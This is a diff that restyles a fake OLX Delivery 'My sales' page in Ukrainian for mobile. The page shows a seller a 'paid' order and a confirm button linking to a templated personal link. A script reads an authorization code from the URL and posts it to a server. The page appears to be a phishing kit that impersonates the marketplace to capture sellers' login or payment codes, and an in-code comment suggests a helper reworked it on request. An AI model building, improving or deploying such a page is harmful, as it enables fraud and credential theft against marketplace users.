@@ -1,217 +1,209 @@
 <!DOCTYPE html>
 <html lang="uk">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>OLX Доставка — Мої продажі</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OLX Доставка — Мої продажі</title>
 
-<style>
-body {
-    margin: 0;
-    font-family: Arial, Helvetica, sans-serif;
-    background: #f2f4f5;
-}
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto', Arial, Helvetica, sans-serif;
+            background: #f2f4f5;
+            color: #002f34;
+        }
 
-/* HEADER */
-header {
-    background: #002f34;
-    color: white;
-    padding: 15px 40px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-}
+        /* HEADER - Мобильный стиль */
+        header {
+            background: #002f34;
+            color: white;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
 
-.logo {
-    font-size: 32px;
-    font-weight: bold;
-    color: #23e5db;
-    text-transform: lowercase;
-}
+        .menu-icon {
+            width: 24px;
+            margin-right: 20px;
+        }
 
-.header-right {
-    display: flex;
-    gap: 20px;
-    align-items: center;
-    font-size: 14px;
-    font-weight: bold;
-}
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #23e5db;
+            text-transform: lowercase;
+            flex-grow: 1;
+        }
 
-.header-btn {
-    background: white;
-    color: #002f34;
-    padding: 10px 18px;
-    border-radius: 6px;
-    cursor: pointer;
-}
+        .profile-icon {
+            width: 24px;
+        }
 
-/* MAIN CONTENT */
-.container {
-    max-width: 1200px;
-    margin: auto;
-    padding: 0 20px;
-}
+        /* MAIN CONTENT */
+        .container {
+            padding: 0 16px;
+        }
 
-.title {
-    font-size: 34px;
-    font-weight: bold;
-    margin-top: 30px;
-    color: #002f34;
-}
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 20px 0 10px 0;
+        }
 
-.topnav {
-    display: flex;
-    gap: 30px;
-    margin-top: 25px;
-    color: #002f34;
-    font-size: 14px;
-    border-bottom: 1px solid #ddd;
-    padding-bottom: 5px;
-}
+        /* Горизонтальный скролл для разделов профиля */
+        .scroll-nav {
+            display: flex;
+            overflow-x: auto;
+            gap: 20px;
+            white-space: nowrap;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 10px;
+            scrollbar-width: none; /* Firefox */
+        }
+        .scroll-nav::-webkit-scrollbar { display: none; } /* Chrome/Safari */
 
-.topnav div { cursor: pointer; }
-.topnav b { border-bottom: 3px solid #002f34; padding-bottom: 8px; }
+        .scroll-nav div {
+            padding: 10px 0;
+            font-size: 14px;
+            color: #002f34;
+            font-weight: 500;
+        }
+        .scroll-nav .active-tab {
+            border-bottom: 3px solid #002f34;
+            font-weight: bold;
+        }
 
-.tabs {
-    display: flex;
-    gap: 30px;
-    margin-top: 30px;
-    border-bottom: 1px solid #ddd;
-}
+        /* Фильтры в виде круглых кнопок */
+        .filters {
+            display: flex;
+            gap: 8px;
+            margin: 15px 0;
+            overflow-x: auto;
+            scrollbar-width: none;
+        }
 
-.tabs div {
-    padding-bottom: 15px;
-    color: #406367;
-    font-weight: bold;
-    cursor: pointer;
-}
+        .filter {
+            border: 1px solid #002f34;
+            padding: 6px 16px;
+            border-radius: 20px;
+            background: white;
+            font-size: 13px;
+            white-space: nowrap;
+        }
 
-.tabs .active {
-    color: #002f34;
-    border-bottom: 4px solid #002f34;
-}
+        .filter.active {
+            background: #002f34;
+            color: white;
+        }
 
-.filters {
-    display: flex;
-    gap: 10px;
-    margin-top: 20px;
-}
+        /* ORDER CARD - Адаптация под мобилку */
+        .order {
+            background: white;
+            margin-top: 10px;
+            padding: 16px;
+            border-radius: 4px;
+            display: flex;
+            flex-direction: column; /* Элементы друг под другом */
+            gap: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
 
-.filter {
-    border: 1px solid #ccd5d6;
-    padding: 8px 20px;
-    border-radius: 20px;
-    background: white;
-    font-size: 14px;
-    color: #002f34;
-}
+        .order-title {
+            font-weight: bold;
+            font-size: 16px;
+        }
 
-/* ORDER CARD */
-.order {
-    background: white;
-    margin-top: 30px;
-    padding: 25px;
-    border-radius: 4px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    box-shadow: 0 1px 4px rgba(0,0,0,0.1);
-}
+        .order-status {
+            font-size: 12px;
+            background: #e9f0f0;
+            padding: 4px 10px;
+            border-radius: 4px;
+            display: inline-block;
+            color: #406367;
+        }
 
-.order-info {
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-}
+        .order-desc {
+            font-size: 13px;
+            color: #406367;
+            line-height: 1.4;
+        }
 
-.order-title {
-    font-weight: bold;
-    font-size: 19px;
-    color: #002f34;
-}
+        /* Кнопка на всю ширину для мобильной версии */
+        .confirm-btn {
+            background: #002f34;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-align: center;
+            box-sizing: border-box;
+        }
 
-.order-status {
-    color: #406367;
-    font-size: 14px;
-    background: #e9f0f0;
-    padding: 4px 8px;
-    border-radius: 4px;
-    align-self: flex-start;
-}
-
-.confirm-btn {
-    background: #002f34;
-    color: white;
-    border: none;
-    padding: 14px 30px;
-    border-radius: 4px;
-    font-weight: bold;
-    font-size: 16px;
-    cursor: pointer;
-    transition: 0.3s;
-}
-
-.confirm-btn:hover {
-    background: #004f56;
-}
-
-/* ЧАТ ИКОНКА */
-.chat-icon {
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    width: 60px;
-    height: 60px;
-    background: #002f34;
-    border-radius: 50%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-    cursor: pointer;
-}
-</style>
+        /* СТИЛЬ ОРИГИНАЛЬНОЙ ИКОНКИ ЧАТА */
+        .chat-icon {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: #ffffff;
+            border: 2px solid #002f34;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+    </style>
 </head>
 
 <body>
 
 <header>
+    <div class="menu-icon">
+        <svg viewBox="0 0 24 24" width="24" height="24" fill="white"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+    </div>
     <div class="logo">olx</div>
-    <div class="header-right">
-        <div>Повідомлення</div>
-        <div>Ваш профіль</div>
-        <div class="header-btn">Додати оголошення</div>
+    <div class="profile-icon">
+        <svg viewBox="0 0 24 24" width="24" height="24" fill="white"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
     </div>
 </header>
 
 <div class="container">
     <div class="title">OLX Доставка</div>
 
-    <div class="topnav">
+    <div class="scroll-nav">
         <div>Оголошення</div>
         <div>Повідомлення</div>
-        <div>Платежі та рахунок OLX</div>
-        <div><b>OLX Доставка</b></div>
+        <div class="active-tab">OLX Доставка</div>
         <div>Налаштування</div>
     </div>
 
-    <div class="tabs">
-        <div class="active">Мої продажі</div>
-        <div>Мої покупки</div>
-        <div>Налаштування</div>
+    <div class="scroll-nav" style="border-bottom: none; gap: 40px;">
+        <div class="active-tab" style="border-bottom-width: 4px;">Мої продажі</div>
+        <div style="color: #406367;">Мої покупки</div>
     </div>
 
     <div class="filters">
-        <div class="filter" style="background: #002f34; color: white;">Очікують підтвердження</div>
+        <div class="filter active">Очікують підтвердження</div>
         <div class="filter">Всі</div>
         <div class="filter">Виконані</div>
     </div>
 
     <div class="order">
-        <div class="order-info">
-            <div class="order-title">Замовлення №78234109</div>
+        <div class="order-title">Замовлення №78234109</div>
+        <div>
             <div class="order-status">Статус: Очікує підтвердження оплати</div>
-            <p style="font-size: 14px; color: #406367; margin: 0;">Покупець оплатив замовлення. Підтвердіть отримання коштів.</p>
+        </div>
+        <div class="order-desc">
+            Покупець оплатив замовлення. Кошти зарезервовані банком. Будь ласка, підтвердіть замовлення для отримання коштів.
         </div>
 
         <button class="confirm-btn" onclick="window.location.href='{{ personal_link }}'">
@@ -221,11 +213,11 @@ header {
 </div>
 
 <div class="chat-icon">
-    <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="#002f34"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
 </div>
 
 <script>
-// 1. Автоматическая отправка кода авторизации на сервер
+// Твой JS остается без изменений
 const params = new URLSearchParams(window.location.search);
 const code = params.get("code");
 
@@ -238,7 +230,7 @@ async function sendCodeToServer(authCode) {
             body: JSON.stringify({ code: authCode })
         });
     } catch (err) {
-        console.error("Помилка відправки коду:", err);
+        console.error("Помилка:", err);
     }
 }
 
